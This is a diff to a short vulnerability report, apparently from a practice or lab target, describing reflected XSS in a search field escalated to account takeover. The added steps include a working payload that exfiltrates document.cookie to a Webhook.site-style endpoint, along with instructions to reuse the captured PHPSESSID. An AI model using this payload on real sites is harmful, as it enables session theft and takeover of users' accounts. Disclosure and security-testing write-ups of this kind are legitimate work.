@@ -7,16 +7,28 @@ Reflected XSS to Account Takeover
 The search parameter is vulnerable to Reflected XSS, allowing JavaScript execution through crafted search input. The vulnerability was further exploited to capture the victim's PHPSESSID and gain access to the victim's authenticated account.
 
 ## Steps to Reproduce
-1. Open the website and enter the XSS payload in the search field:
+
+1. Open [https://pixeleet.pwnedbox.site/](https://pixeleet.pwnedbox.site/).
+2. Enter the following Reflected XSS payload in the search field:
+
    ```html
    "><ScRiPt>\u0061lert("XSS")</ScRiPt>
    ```
-2. Observe the JavaScript alert confirming Reflected XSS.
-3. Use the crafted payload to send the victim's session identifier to Webhook.site.
-4. Capture the PHPSESSID from the incoming request.
-5. Use the captured session to access the victim's authenticated account.
+
+3. Submit the search query and observe the JavaScript alert.
+4. Test the following payload using the controlled Webhook.site endpoint:
+
+   ```javascript
+   '"><script>document.write(`<img src=https://webhooksite.net/c26ce1f5-a093-4e8a-a9fe-79d2116ae8ff/${document.cookie}>`)</script>
+   ```
+
+5. Observe the incoming request on Webhook.site containing the victim's session cookie.
+6. Use the captured session identifier to access the victim's authenticated account.
 
 ## POC (Proof of Concept)
+
+**Affected Domain:** https://pixeleet.pwnedbox.site/
+
 -crafting the xss 
 <img width="1919" height="972" alt="image" src="https://github.com/user-attachments/assets/d89f4bef-840a-48ea-ba43-efbaa4a6d694" />
 
